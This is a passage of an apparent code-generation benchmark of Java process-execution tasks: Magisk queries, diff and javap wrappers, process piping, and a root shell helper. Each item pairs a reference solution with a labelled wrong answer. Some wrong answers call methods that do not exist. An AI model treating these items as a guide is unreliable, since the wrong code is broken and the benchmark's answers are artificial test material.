    "Instruction": "Task Description: The task involves creating utility functions for executing system commands and retrieving information about the Magisk tool using Java's ProcessBuilder for inter-process communication.\n\nFunction Description: The provided code consists of three utility functions that work with system processes to execute commands and retrieve Magisk-related information. These functions demonstrate proper process handling, stream management, and error handling in Java.\n\nMethods:\n\nMethod1: exec(String... command) -> void - Executes a system command using ProcessBuilder. Takes a variable number of strings representing the command and its arguments. Logs the exit code or any errors encountered during execution.\n\nMethod2: getMagiskVersionCode() -> int - Retrieves the version code of Magisk by executing 'magisk -V' command. Returns the version code as an integer, or -1 if an error occurs. Caches the result for subsequent calls.\n\nMethod3: getMagiskTmpfsPath() -> String - Retrieves the tmpfs path used by Magisk by executing 'magisk --path' command. Returns the path as a string, or an empty string if an error occurs. Checks Magisk version first and returns '/sbin' for older versions (<21000). Caches the result for subsequent calls.\n\nAttributes:\nmagiskVersionCode: int - Caches the Magisk version code to avoid repeated process execution\nmagiskTmpfsPath: String - Caches the Magisk tmpfs path to avoid repeated process execution",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.Executors;\n\npublic static void exec(String... command) {\n    ProcessBuilder pb = new ProcessBuilder(command);\n    try {\n        Process process = pb.start();\n        int code = process.waitFor();\n        Log.i(TAG, \"Exec \" + command[0] + \" exited with \" + code);\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec \" + command[0], e);\n    }\n}\n\npublic static int getMagiskVersionCode() {\n    if (magiskVersionCode != -1) {\n        return magiskVersionCode;\n    }\n\n    try {\n        ProcessBuilder ps = new ProcessBuilder(\"magisk\", \"-V\");\n        ps.redirectErrorStream(true);\n        Process pr = ps.start();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n        String line = in.readLine();\n        Log.i(TAG, \"Exec magisk -V: \" + line);\n        magiskVersionCode = Integer.parseInt(line);\n        pr.waitFor();\n        in.close();\n        return magiskVersionCode;\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec magisk -V\", e);\n        return -1;\n    }\n}\n\npublic static String getMagiskTmpfsPath() {\n    if (magiskTmpfsPath != null) {\n        return magiskTmpfsPath;\n    }\n\n    if (getMagiskVersionCode() < 21000) {\n        return \"/sbin\";\n    }\n\n    try {\n        ProcessBuilder ps = new ProcessBuilder(\"magisk\", \"--path\");\n        ps.redirectErrorStream(true);\n        Process pr = ps.start();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n        magiskTmpfsPath = in.readLine();\n        Log.i(TAG, \"Exec magisk --path: \" + magiskTmpfsPath);\n        pr.waitFor();\n        in.close();\n        return magiskTmpfsPath;\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec magisk --path\", e);\n        return \"\";\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class MagiskUtils {\n    private static int magiskVersionCode = -1;\n    private static String magiskTmpfsPath = \"\";\n\n    public void exec(String... command) {\n        try {\n            ProcessBuilder pb = new ProcessBuilder(command);\n            Process process = pb.start();\n            Thread inputThread = new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        System.out.println(line);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n            Thread errorThread = new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        System.err.println(line);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n            inputThread.start();\n            errorThread.start();\n            int exitCode = process.waitFor();\n            System.out.println(\"Exit code: \" + exitCode);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public int getMagiskVersionCode() {\n        if (magiskVersionCode != -1) {\n            return magiskVersionCode;\n        }\n        try {\n            ProcessBuilder pb = new ProcessBuilder(\"magisk\", \"-V\");\n            Process process = pb.start();\n            StringBuilder output = new StringBuilder();\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    output.append(line);\n                }\n            }\n            try (BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                String errorLine;\n                while ((errorLine = errorReader.readLine()) != null) {\n                    System.err.println(errorLine);\n                }\n            }\n            int exitCode = process.waitFor();\n            if (exitCode == 0) {\n                magiskVersionCode = Integer.parseInt(output.toString());\n                return magiskVersionCode;\n            } else {\n                return -1;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return -1;\n        }\n    }\n\n    public String getMagiskTmpfsPath() {\n        if (!magiskTmpfsPath.isEmpty()) {\n            return magiskTmpfsPath;\n        }\n        if (magiskVersionCode < 21000) {\n            return \"/sbin\";\n        }\n        try {\n            ProcessBuilder pb = new ProcessBuilder(\"magisk\", \"--path\");\n            Process process = pb.start();\n            StringBuilder output = new StringBuilder();\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    output.append(line);\n                }\n            }\n            try (BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                String errorLine;\n                while ((errorLine = errorReader.readLine()) != null) {\n                    System.err.println(errorLine);\n                }\n            }\n            int exitCode = process.waitFor();\n            if (exitCode == 0) {\n                magiskTmpfsPath = output.toString().trim();\n                return magiskTmpfsPath;\n            } else {\n                return \"\";\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return \"\";\n        }\n    }\n}"
  },
  {
    "Task_id": 296,
    "Instruction": "Task Description: Create a function that executes an external diff tool to compare two files and generate a difference file, while capturing and logging the tool's output.\n\nFunction Description: The function `diffFile` executes an external diff utility specified by its path and arguments, comparing two input files (old and new versions) and generating a difference file. It captures the standard output and error streams of the external process, logs them, and waits for the process to complete before returning.\n\nInput:\n- `mCustomDiffPath`: String - Path to the external diff tool executable\n- `mCustomDiffPathArgs`: String - Arguments to pass to the diff tool (space-separated)\n- `oldFile`: File - The original file to compare against\n- `newFile`: File - The modified file to compare\n- `diffFile`: File - The output file where differences will be written\n\nOutput:\n- None (void) - The function doesn't return any value but writes the diff output to the specified file and logs the process output\n- Throws IOException if process execution fails\n- Throws InterruptedException if the process is interrupted while waiting",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic static void diffFile(String mCustomDiffPath, String mCustomDiffPathArgs, File oldFile, File newFile, File diffFile) throws IOException {\n    String outPath = diffFile.getAbsolutePath();\n    String cmd = mCustomDiffPath;\n    List<String> cmds = new ArrayList<>();\n    for (String s : cmd.split(\" \")) {\n        if (!s.isEmpty()) {\n            cmds.add(s);\n        }\n    }\n    for (String s : mCustomDiffPathArgs.split(\" \")) {\n        if (!s.isEmpty()) {\n            cmds.add(s);\n        }\n    }\n    cmds.add(oldFile.getAbsolutePath());\n    cmds.add(newFile.getAbsolutePath());\n    cmds.add(outPath);\n\n    ProcessBuilder pb = new ProcessBuilder(cmds);\n    pb.redirectErrorStream(true);\n    Process process = pb.start();\n    BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));\n    String line;\n    while ((line = br.readLine()) != null) {\n        Logger.d(line);\n    }\n    int exitCode = process.waitFor();\n    process.destroy();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public void diffFile(String mCustomDiffPath, String mCustomDiffPathArgs, File oldFile, File newFile, File diffFile) throws IOException, InterruptedException {\n    List<String> command = new ArrayList<>();\n    command.add(mCustomDiffPath);\n    String[] args = mCustomDiffPathArgs.split(\" \");\n    for (String arg : args) {\n        command.add(arg);\n    }\n    command.add(oldFile.getAbsolutePath());\n    command.add(newFile.getAbsolutePath());\n\n    ProcessBuilder pb = new ProcessBuilder(command);\n    pb.redirectErrorStream(false);\n    Process process = pb.start();\n\n    Thread stdoutThread = new Thread(() -> {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n            try (FileOutputStream fos = new FileOutputStream(diffFile)) {\n                try (BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(fos))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        writer.write(line);\n                        writer.newLine();\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    });\n\n    Thread stderrThread = new Thread(() -> {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.err.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    });\n\n    stdoutThread.start();\n    stderrThread.start();\n\n    try {\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new IOException(\"Diff process exited with code \" + exitCode);\n        }\n    } catch (InterruptedException e) {\n        Thread.currentThread().interrupt();\n        throw e;\n    }\n}"
  },
  {
    "Task_id": 297,
    "Instruction": "Task Description: Create a Java class that executes external processes, handles their output streams, and provides a way to interact with the process execution through callback methods.\n\nClass Description: The ProcessExecutor class is designed to manage external process execution in a cross-platform manner (handling Windows and Unix-like systems differently). It provides methods to start processes, redirect their output streams, and handle both standard output and error streams through a handler interface.\n\nAttributes:\n- process: Process - Represents the currently running external process\n- processBuilder: ProcessBuilder - Used to configure and start external processes\n\nMethods:\n- execRedirected: static Process(String[] command) throws IOException - Configures and starts an external process with error stream redirected to standard output. Handles Windows-specific command formatting.\n  - Input: String[] command - The command and arguments to execute\n  - Output: Process - The started process instance\n\n- listenOnProcess: int(String[] arguments, ProcessOutputHandler handler) - Executes a command and listens to its output streams, forwarding output lines and errors to the handler.\n  - Input: \n    - String[] arguments - The command and arguments to execute\n    - ProcessOutputHandler handler - Callback interface for handling output and errors\n  - Output: int - The exit value of the process (-1 if execution failed)\n\n- ProcessOutputHandler: interface - Callback interface for handling process output and errors\n  - Methods:\n    - handleOutputLine: void(String line) - Called for each line of output from the process\n    - handleError: void(String errorMessage) - Called when an error occurs during process execution",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.Map;\n\npublic class ProcessExecutor {\n\n    private Process process;\n    private ProcessBuilder processBuilder;\n\n    public static Process execRedirected(String[] command) throws IOException {\n        ProcessBuilder pb;\n\n        if (!OSUtils.isWindows()) {\n            pb = new ProcessBuilder(command);\n        } else {\n            String[] cmdLine = new String[command.length];\n            for (int i = 0; i < command.length; i++)\n                cmdLine[i] = command[i].replace(\"\\\"\", \"\\\\\\\"\");\n            pb = new ProcessBuilder(cmdLine);\n            Map<String, String> env = pb.environment();\n            env.put(\"CYGWIN\", \"nodosfilewarning\");\n        }\n        pb.redirectErrorStream(true);\n\n        return pb.start();\n    }\n\n    public int listenOnProcess(String[] arguments, ProcessOutputHandler handler) {\n        try {\n            final Process p = execRedirected(arguments);\n            Thread thread = new Thread() {\n                public void run() {\n                    try {\n                        InputStreamReader reader = new InputStreamReader(p.getInputStream());\n                        int c;\n                        String line = \"\";\n                        while ((c = reader.read()) != -1) {\n                            if ((char) c == '\\r')\n                                continue;\n                            if ((char) c == '\\n') {\n                                handler.handleOutputLine(line);\n                                line = \"\";\n                            } else {\n                                line += (char) c;\n                            }\n                        }\n                        handler.handleOutputLine(line);\n                        reader.close();\n\n                        reader = new InputStreamReader(p.getErrorStream());\n                        while ((c = reader.read()) != -1)\n                            System.err.print((char) c);\n                        reader.close();\n                    } catch (Exception e) {\n                        handler.handleError(\"Run Exception: \" + e.getMessage());\n                    }\n                }\n            };\n            thread.start();\n            int res = p.waitFor();\n            thread.join();\n            return res;\n        } catch (Exception e) {\n            handler.handleError(\"Process Exception: \" + e.getMessage());\n        }\n        return -1;\n    }\n\n    public interface ProcessOutputHandler {\n        void handleOutputLine(String line);\n        void handleError(String errorMessage);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ProcessExecutor {\n    public static Process execRedirected(String[] command) throws IOException {\n        String os = System.getProperty(\"os.name\").toLowerCase();\n        if (os.contains(\"windows\")) {\n            if (command.length > 0) {\n                String[] newCommand = new String[command.length + 2];\n                newCommand[0] = \"cmd\";\n                newCommand[1] = \"/c\";\n                System.arraycopy(command, 0, newCommand, 2, command.length);\n                command = newCommand;\n            }\n        }\n        ProcessBuilder pb = new ProcessBuilder(command);\n        pb.redirectErrorStream(true);\n        return pb.start();\n    }\n\n    public int listenOnProcess(String[] arguments, ProcessOutputHandler handler) {\n        ProcessBuilder pb = new ProcessBuilder(arguments);\n        pb.redirectErrorStream(false);\n        Process process = pb.start();\n\n        Thread inputThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    handler.handleOutputLine(line);\n                }\n            } catch (IOException e) {\n                handler.handleError(e.getMessage());\n            }\n        });\n\n        Thread errorThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    handler.handleError(line);\n                }\n            } catch (IOException e) {\n                handler.handleError(e.getMessage());\n            }\n        });\n\n        inputThread.start();\n        errorThread.start();\n\n        try {\n            inputThread.join();\n            errorThread.join();\n        } catch (InterruptedException e) {\n            handler.handleError(e.getMessage());\n        }\n\n        int exitCode = process.waitFor();\n        if (exitCode < 0) {\n            handler.handleError(\"Process was terminated by signal\");\n        }\n        return exitCode;\n    }\n\n    public interface ProcessOutputHandler {\n        void handleOutputLine(String line);\n        void handleError(String errorMessage);\n    }\n}"
  },
  {
    "Task_id": 298,
    "Instruction": "Task Description: Create a Java function that disassembles a Java class file using the `javap` command-line tool and returns the disassembled output as a string.\n\nFunction Description: The function `disassembleClassFromJava` takes a Java class file as input, executes the `javap -c` command on it to disassemble the bytecode, and returns the disassembled output as a string. It handles the process execution, stream management, and error handling.\n\nInput: \n- `resourceFile` (String): The path or name of the Java class file to be disassembled.\n\nOutput: \n- (String): The disassembled bytecode output from the `javap` command. If an error occurs, returns an error message string.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.StringWriter;\nimport java.net.URL;\n\npublic String disassembleClassFromJava(String resourceFile) {\n    try {\n        ProcessBuilder pb = new ProcessBuilder(\"javap\", \"-c\", resourceFile)\n                .redirectErrorStream(true);\n\n        final Process process = pb.start();\n        final StringWriter writer = new StringWriter();\n        new Thread(() -> IOUtils.copyStreamNoException(process.getInputStream(), writer)).start();\n\n        final int ignored = process.waitFor();\n        final String processOutput = writer.toString();\n        return processOutput;\n    } catch (InterruptedException e) {\n        Thread.currentThread().interrupt();\n        return \"Unable to run javap command (\" + e.getMessage() + \").\";\n    } catch (IOException e) {\n        return \"Unable to run javap command (\" + e.getMessage() + \").\";\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public static String disassembleClassFromJava(String resourceFile) {\n    try {\n        ProcessBuilder pb = new ProcessBuilder(\"javap\", \"-c\", resourceFile);\n        Process process = pb.start();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));\n        StringBuilder output = new StringBuilder();\n        StringBuilder errorOutput = new StringBuilder();\n\n        String line;\n        while ((line = reader.readLine()) != null) {\n            output.append(line).append(\"\\n\");\n        }\n        while ((line = errorReader.readLine()) != null) {\n            errorOutput.append(line).append(\"\\n\");\n        }\n\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            return errorOutput.toString();\n        } else {\n            return output.toString();\n        }\n    } catch (Exception e) {\n        return \"Error: \" + e.getMessage();\n    }\n}"
  },
  {
    "Task_id": 299,
    "Instruction": "Task Description: Create a Java class that facilitates the execution of external processes and manages their input/output streams, including support for piping data between multiple processes.\n\nClass Description: The ProcessRunner class provides functionality to execute external processes and handle their input/output streams efficiently. It supports both simple process execution and complex piping between multiple processes. The class uses ProcessBuilder for process creation and AsyncPipe threads for non-blocking stream handling.\n\nAttributes:\n- processRoot: File - The working directory for executed processes\n\nMethods:\n- execute(ProcessBuilder pb) -> void - Executes a single process with its output and error streams redirected to System.out and System.err respectively. Throws IOException and InterruptedException.\n- pipe(InputStream is, OutputStream os, ProcessBuilder... builders) -> void - Executes multiple processes in sequence, piping the output of one process to the input of the next. Uses temporary files for intermediate storage. Throws IOException and InterruptedException.\n- AsyncPipe(InputStream is, OutputStream os) - Constructor for AsyncPipe thread that handles stream copying and closes streams when done.\n- AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) - Constructor for AsyncPipe thread with option to control stream closing behavior.\n- run() -> void - (AsyncPipe method) The thread's main execution method that copies data between streams.",
    "Canonical_solution": "import com.google.common.base.Joiner;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class ProcessRunner {\n\n  File processRoot;\n\n  public ProcessRunner(File processRoot) {\n    this.processRoot = processRoot;\n  }\n\n  public void execute(ProcessBuilder pb) throws IOException, InterruptedException {\n    System.out.println(Joiner.on(\" \").join(pb.command()));\n    Process process = pb.redirectErrorStream(true).directory(processRoot).start();\n    new AsyncPipe(process.getErrorStream(), System.err).start();\n    new AsyncPipe(process.getInputStream(), System.out).start();\n    process.waitFor();\n  }\n\n  public void pipe(InputStream is, OutputStream os, ProcessBuilder... builders)\n      throws IOException, InterruptedException {\n    int i = 0;\n    File tempin;\n    File tempout = File.createTempFile(\"pipe\", \"txt\");\n    OutputStream tos;\n    for (ProcessBuilder builder : builders) {\n      if (i == 0) {\n      } else {\n        tempin = tempout;\n        is = new FileInputStream(tempin);\n      }\n      if (i == builders.length - 1) {\n        if (os == null) {\n          tos = System.out;\n        } else {\n          tos = os;\n        }\n      } else {\n        tempout = File.createTempFile(\"pipe\", \"txt\");\n        tos = new FileOutputStream(tempout);\n      }\n      Process process = builder.redirectErrorStream(true).directory(processRoot).start();\n      new AsyncPipe(process.getErrorStream(), System.err, false).start();\n      new AsyncPipe(process.getInputStream(), tos).start();\n      if (is != null) {\n        new AsyncPipe(is, process.getOutputStream()).start();\n      }\n      i++;\n      process.waitFor();\n    }\n  }\n\n  class AsyncPipe extends Thread {\n\n    InputStream is;\n    OutputStream os;\n    boolean closeStreams;\n\n    AsyncPipe(InputStream is, OutputStream os) {\n      this.is = is;\n      this.os = os;\n      closeStreams = true;\n    }\n\n    AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n      this.is = is;\n      this.os = os;\n      this.closeStreams = closeStreams;\n    }\n\n    @Override\n    public void run() {\n      try {\n        synchronized (this) {\n          byte[] buf = new byte[4096];\n          int i;\n          while ((i = is.read(buf)) != -1) {\n            os.write(buf, 0, i);\n          }\n          if (closeStreams) {\n            os.close();\n            is.close();\n          }\n        }\n      } catch (IOException e) {\n        e.printStackTrace();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "class ProcessRunner {\n    private final File processRoot;\n\n    public ProcessRunner(File processRoot) {\n        this.processRoot = processRoot;\n    }\n\n    public void execute(ProcessBuilder pb) throws IOException, InterruptedException {\n        Process process = pb.start();\n        new AsyncPipe(process.getInputStream(), System.out).start();\n        new AsyncPipe(process.getErrorStream(), System.err).start();\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new RuntimeException(\"Process exited with code \" + exitCode);\n        }\n    }\n\n    public void pipe(InputStream is, OutputStream os, ProcessBuilder... builders) throws IOException, InterruptedException {\n        if (builders.length == 0) {\n            throw new IllegalArgumentException(\"No builders provided\");\n        }\n\n        ProcessBuilder pb = new ProcessBuilder(builders[0].getCommand());\n        pb.setWorkingDirectory(processRoot);\n        pb.setInputStream(is);\n        Process process = pb.start();\n\n        OutputStream prevOutput = os;\n        for (int i = 1; i < builders.length; i++) {\n            ProcessBuilder pbNext = new ProcessBuilder(builders[i].getCommand());\n            pbNext.setWorkingDirectory(processRoot);\n            pbNext.setInputStream(prevOutput);\n            Process processNext = pbNext.start();\n            prevOutput = processNext.getOutputStream();\n        }\n\n        for (int i = 0; i < builders.length; i++) {\n            process.waitFor();\n        }\n    }\n\n    static class AsyncPipe implements Runnable {\n        private final InputStream is;\n        private final OutputStream os;\n        private final boolean closeStreams;\n\n        public AsyncPipe(InputStream is, OutputStream os) {\n            this(is, os, true);\n        }\n\n        public AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n            this.is = is;\n            this.os = os;\n            this.closeStreams = closeStreams;\n        }\n\n        @Override\n        public void run() {\n            try {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = is.read(buffer)) != -1) {\n                    os.write(buffer, 0, bytesRead);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                if (closeStreams) {\n                    try {\n                        if (is != null) is.close();\n                        if (os != null) os.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 300,
    "Instruction": "Task Description: Implement a function that executes an external process, captures its output and error streams, and handles the results appropriately, including error cases and output printing.\n\nFunction Description: The function `doFork` executes an external process specified by a command string, redirects its standard output and error streams to files, and optionally prints them. It waits for the process to complete, checks the exit code, and handles any exceptions or errors that occur during execution. The function also interacts with a `BinaryLinkServer` to retrieve results or exceptions from the forked process.\n\nInput:\n- `reader`: BinaryLinkServer - An object that reads results from the forked process and may contain exceptions.\n- `commandString`: List<String> - The command and arguments to execute the external process.\n- `stdOut`: File - The file to which the standard output of the process will be redirected.\n- `stdErr`: File - The file to which the standard error of the process will be redirected.\n- `printOut`: boolean - If true, the standard output will be printed to the console.\n- `printErr`: boolean - If true, the standard error will be printed to the console.\n\nOutput:\n- Returns `List<IterationResult>` - A list of results from the forked process if execution is successful.\n- Throws `BenchmarkException` - If the process fails (non-zero exit code), an IOException occurs, or the thread is interrupted.",
    "Canonical_solution": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.List;\n\nprivate List<IterationResult> doFork(BinaryLinkServer reader, List<String> commandString,\n                                    File stdOut, File stdErr, boolean printOut, boolean printErr) {\n    try (FileOutputStream fosErr = new FileOutputStream(stdErr);\n         FileOutputStream fosOut = new FileOutputStream(stdOut)) {\n        ProcessBuilder pb = new ProcessBuilder(commandString);\n        Process p = pb.start();\n\n        InputStreamDrainer errDrainer = new InputStreamDrainer(p.getErrorStream(), fosErr);\n        InputStreamDrainer outDrainer = new InputStreamDrainer(p.getInputStream(), fosOut);\n\n        if (printErr) {\n            errDrainer.addOutputStream(new OutputFormatAdapter(out));\n        }\n\n        if (printOut) {\n            outDrainer.addOutputStream(new OutputFormatAdapter(out));\n        }\n\n        errDrainer.start();\n        outDrainer.start();\n\n        int ecode = p.waitFor();\n\n        errDrainer.join();\n        outDrainer.join();\n\n        reader.waitFinish();\n\n        if (ecode != 0) {\n            out.println(\"<forked VM failed with exit code \" + ecode + \">\");\n            out.println(\"<stdout last='\" + TAIL_LINES_ON_ERROR + \" lines'>\");\n            for (String l : FileUtils.tail(stdOut, TAIL_LINES_ON_ERROR)) {\n                out.println(l);\n            }\n            out.println(\"</stdout>\");\n            out.println(\"<stderr last='\" + TAIL_LINES_ON_ERROR + \" lines'>\");\n            for (String l : FileUtils.tail(stdErr, TAIL_LINES_ON_ERROR)) {\n                out.println(l);\n            }\n            out.println(\"</stderr>\");\n\n            out.println(\"\");\n        }\n\n        BenchmarkException exception = reader.getException();\n        if (exception == null) {\n            if (ecode == 0) {\n                return reader.getResults();\n            } else {\n                throw new BenchmarkException(new IllegalStateException(\"Forked VM failed with exit code \" + ecode));\n            }\n        } else {\n            throw exception;\n        }\n\n    } catch (IOException ex) {\n        out.println(\"<failed to invoke the VM, caught IOException: \" + ex.getMessage() + \">\");\n        out.println(\"\");\n        throw new BenchmarkException(ex);\n    } catch (InterruptedException ex) {\n        out.println(\"<host VM has been interrupted waiting for forked VM: \" + ex.getMessage() + \">\");\n        out.println(\"\");\n        throw new BenchmarkException(ex);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public List<IterationResult> doFork(BinaryLinkServer reader, List<String> commandString, File stdOut, File stdErr, boolean printOut, boolean printErr) throws BenchmarkException {\n    try {\n        ProcessBuilder pb = new ProcessBuilder(commandString);\n        Process process = pb.start();\n\n        InputStream stdout = process.getInputStream();\n        InputStream stderr = process.getErrorStream();\n\n        Thread stdoutThread = new Thread(() -> {\n            try (BufferedReader stdoutReader = new BufferedReader(new InputStreamReader(stdout))) {\n                try (BufferedWriter stdoutWriter = new BufferedWriter(new FileWriter(stdOut))) {\n                    String line;\n                    while ((line = stdoutReader.readLine()) != null) {\n                        stdoutWriter.write(line + \"\\n\");\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        stdoutThread.start();\n\n        Thread stderrThread = new Thread(() -> {\n            try (BufferedReader stderrReader = new BufferedReader(new InputStreamReader(stderr))) {\n                try (BufferedWriter stderrWriter = new BufferedWriter(new FileWriter(stdErr))) {\n                    String line;\n                    while ((line = stderrReader.readLine()) != null) {\n                        stderrWriter.write(line + \"\\n\");\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        stderrThread.start();\n\n        if (printOut) {\n            Thread printOutThread = new Thread(() -> {\n                try (BufferedReader stdoutReader = new BufferedReader(new InputStreamReader(stdout))) {\n                    String line;\n                    while ((line = stdoutReader.readLine()) != null) {\n                        System.out.println(line);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n            printOutThread.start();\n        }\n\n        if (printErr) {\n            Thread printErrThread = new Thread(() -> {\n                try (BufferedReader stderrReader = new BufferedReader(new InputStreamReader(stderr))) {\n                    String line;\n                    while ((line = stderrReader.readLine()) != null) {\n                        System.err.println(line);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n            printErrThread.start();\n        }\n\n        int exitCode = process.waitFor();\n\n        if (exitCode != 0) {\n            throw new BenchmarkException(\"Process exited with code \" + exitCode);\n        }\n\n        List<IterationResult> results = reader.readResults();\n        return results;\n    } catch (IOException | InterruptedException e) {\n        throw new BenchmarkException(\"Error executing process: \" + e.getMessage());\n    }\n}"
  },
  {
    "Task_id": 301,
    "Instruction": "Task Description: Create a Java utility class for executing shell commands with root privileges and handling process execution in Android environments.\n\nClass Description: ShellUtils is a utility class designed to execute shell commands, particularly in rooted Android environments. It provides methods for finding system binaries, executing commands with or without root privileges, and handling process input/output streams. The class includes functionality for environment variable handling and process synchronization.\n\nAttributes:\n\nBINARY_PLACES: String[] - Array of common binary directories in Android systems for command lookup\nPYTHON_HOME: String - Path to Python installation directory\nDATA_DIR: File - Application data directory\nBUSYBOX_FILE: File - Path to busybox binary\nIS_ROOTED: Boolean - Cached flag indicating whether the device is rooted\n\nMethods:\n\nexecuteNoWait: executeNoWait(Map<String, String> env, String... command) -> Process - Executes a command without waiting for completion, with optional environment variables\nsudoNoWait: sudoNoWait(Map<String, String> env, String... command) -> Process - Executes a command with root privileges (using su) without waiting for completion\nwaitFor: waitFor(String command, Process process) -> String - Waits for process completion and returns output, throws exception if process fails\nfindCommand: findCommand(String command) -> String - Searches for a command in common binary directories and returns full path if found",
    "Canonical_solution": "import java.io.*;\nimport java.util.*;\n\npublic class ShellUtils {\n    private final static String[] BINARY_PLACES = {\"/data/bin/\", \"/system/bin/\", \"/system/xbin/\", \"/sbin/\",\n            \"/data/local/xbin/\", \"/data/local/bin/\", \"/system/sd/xbin/\", \"/system/bin/failsafe/\",\n            \"/data/local/\"};\n    private final static String PYTHON_HOME = \"/data/data/fq.router2/python\";\n    public static File DATA_DIR = new File(\"/data/data/fq.router2\");\n    public static File BUSYBOX_FILE = new File(DATA_DIR, \"busybox\");\n    private static Boolean IS_ROOTED = null;\n\n    public static Process executeNoWait(Map<String, String> env, String... command) throws IOException {\n        List<String> envp = new ArrayList<String>();\n        for (Map.Entry<String, String> entry : env.entrySet()) {\n            envp.add(entry.getKey() + \"=\" + entry.getValue());\n        }\n        return Runtime.getRuntime().exec(command, envp.toArray(new String[envp.size()]));\n    }\n\n    public static Process sudoNoWait(Map<String, String> env, String... command) throws Exception {\n        if (Boolean.FALSE.equals(IS_ROOTED)) {\n            return executeNoWait(env, command);\n        }\n        ProcessBuilder processBuilder = new ProcessBuilder();\n        Process process = processBuilder\n                .command(findCommand(\"su\"))\n                .redirectErrorStream(true)\n                .start();\n        OutputStreamWriter stdin = new OutputStreamWriter(process.getOutputStream());\n        try {\n            for (Map.Entry<String, String> entry : env.entrySet()) {\n                stdin.write(entry.getKey());\n                stdin.write(\"=\");\n                stdin.write(entry.getValue());\n                stdin.write(\" \");\n            }\n            for (String c : command) {\n                stdin.write(c);\n                stdin.write(\" \");\n            }\n            stdin.write(\"\\nexit\\n\");\n        } finally {\n            stdin.close();\n        }\n        return process;\n    }\n\n    public static String waitFor(String command, Process process) throws Exception {\n        BufferedReader stdout = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        StringBuilder output = new StringBuilder();\n        try {\n            String line;\n            while (null != (line = stdout.readLine())) {\n                output.append(line);\n                output.append(\"\\n\");\n            }\n        } finally {\n            stdout.close();\n        }\n        